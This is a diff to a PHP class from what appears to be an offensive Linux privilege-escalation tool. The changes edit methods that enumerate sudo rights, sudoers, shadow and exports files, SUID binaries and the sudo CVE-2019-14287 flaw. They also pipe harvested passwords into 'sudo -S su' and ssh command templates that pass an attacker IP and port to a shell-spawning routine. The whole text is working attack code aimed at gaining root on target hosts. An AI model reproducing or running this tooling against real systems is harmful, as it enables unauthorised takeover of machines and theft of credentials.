@@ -56,7 +56,7 @@ class check4linux8misc extends check4linux8enum{
 
         
         
-        $template_id_euid = "echo '' | sudo -S -l -k %ID% 2>/dev/null";
+        $template_id_euid = "sudo -l -k %ID% 2>/dev/null";
         $this->lan2pentest8id($template_id_euid, $attacker_ip, $attacker_port, $shell);
     }
     
@@ -159,9 +159,7 @@ lxc launch SomeAlias MyMachine
     
     public function misc(){
         $this->titre(__FUNCTION__);
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2container();$this->pause(); 
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2keys();$this->pause();
-        if (!$this->ip2root8db($this->ip2id))  $this->misc4passwd();$this->pause();
+
         if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_sudoers();$this->pause();
         if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_exports();$this->pause();
         if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_shadow();$this->pause();
@@ -169,6 +167,9 @@ lxc launch SomeAlias MyMachine
         if (!$this->ip2root8db($this->ip2id))  $this->misc2sudo8CVE_2019_14287();$this->pause();       
         if (!$this->ip2root8db($this->ip2id))  $this->misc2writable_files();$this->pause();
         if (!$this->ip2root8db($this->ip2id))  $this->misc2readable_files();$this->pause();
+        if (!$this->ip2root8db($this->ip2id))  $this->misc2container();$this->pause();
+        if (!$this->ip2root8db($this->ip2id))  $this->misc2keys();$this->pause();
+        if (!$this->ip2root8db($this->ip2id))  $this->misc4passwd();$this->pause();
     }
     
     
@@ -231,7 +232,7 @@ lxc launch SomeAlias MyMachine
         $userpass = trim($userpass);
         $ssh_port = trim($ssh_port);
         
-        $template_id_euid = "sshpass ssh -i $remote_privkey_path  $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' ";
+        $template_id_euid = "echo -e \"ssh $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' <<#$userpass\n> /dev/tty\nls > /dev/tty\n#\" | bash ";
         $attacker_ip = $this->ip4addr4target($this->ip);
         $attacker_port = rand(1024,65535);
         $shell = "/bin/bash";
@@ -771,13 +772,13 @@ Can be used to determine where other interesting files might be located");
         foreach ($users_passwd as $user2name => $user2pass){
             if (!empty($user2name))
                 if (!$this->ip2root8db($this->ip2id)) {
-                    $this->users4root($user2name,$user2pass);
-                    $this->users2sudoers8filepath($this->users2sudoers2list($user2name, $user2pass));
+                    if (!$this->ip2root8db($this->ip2id)) $this->users4root($user2name,$user2pass);
+                    if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($this->users2sudoers2list($user2name, $user2pass));
                     
                     foreach ($tab_users_shell as $user2name_shell)
                         if (!$this->ip2root8db($this->ip2id)) {
-                            $this->users4root($user2name_shell,$user2pass);
-                            $this->users2sudoers8filepath($this->users2sudoers2list($user2name_shell, $user2pass));
+                            if (!$this->ip2root8db($this->ip2id)) $this->users4root($user2name_shell,$user2pass);
+                            if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($this->users2sudoers2list($user2name_shell, $user2pass));
                         }
                 }
         }
@@ -818,7 +819,7 @@ Can be used to determine where other interesting files might be located");
             if (!empty($app)) {
                 
                 $this->article("$i/$size", $app);
-                if (!$this->ip2root8db($this->ip2id)) $this->lan2root8bin($app, TRUE, $this->uid_pass);$this->pause();
+                if (!$this->ip2root8db($this->ip2id)) $this->lan2root8bin($app, TRUE, '');$this->pause();
                 if (!$this->ip2root8db($this->ip2id)) $this->suids4one($app);$this->pause();
                 if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path2xtrace($app);$this->pause();
             }
@@ -840,7 +841,7 @@ Can be used to determine where other interesting files might be located");
         //$attacker_port = 7777;
         $shell = "/bin/bash";
         //$template_id_euid = "( sleep $this->stream_timeout*3 ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su --login $user_name --shell $shell --command %ID%\",pty,stderr,setsid,sigint,ctty,sane";
-        $template_id_euid = "echo '$user_pass' | sudo -S su --login '$user_name' --shell $shell --command '%ID%' ";
+        $template_id_euid = "echo '$user_pass' | sudo -S su --login '$user_name' --shell $shell --command '%ID%' 2>1 ";
         
         
         return $this->lan2pentest8id($template_id_euid, $attacker_ip, $attacker_port, $shell);
